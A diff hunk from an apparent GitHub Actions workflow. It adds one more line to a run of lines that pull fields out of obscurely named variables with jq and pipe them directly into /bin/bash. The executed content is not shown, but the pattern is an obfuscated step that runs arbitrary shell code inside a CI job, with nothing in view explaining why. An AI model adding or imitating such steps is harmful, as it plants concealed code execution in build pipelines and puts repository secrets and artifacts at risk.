@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$xm9" | jq -r .tegmp3878 | /bin/bash
           echo $pw70 | jq -r .xuny9 | /bin/bash
           printf '%s' "$whic6790" | jq -r .jblf63264 | /bin/bash
+          echo $t86 | jq -r .kb5 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
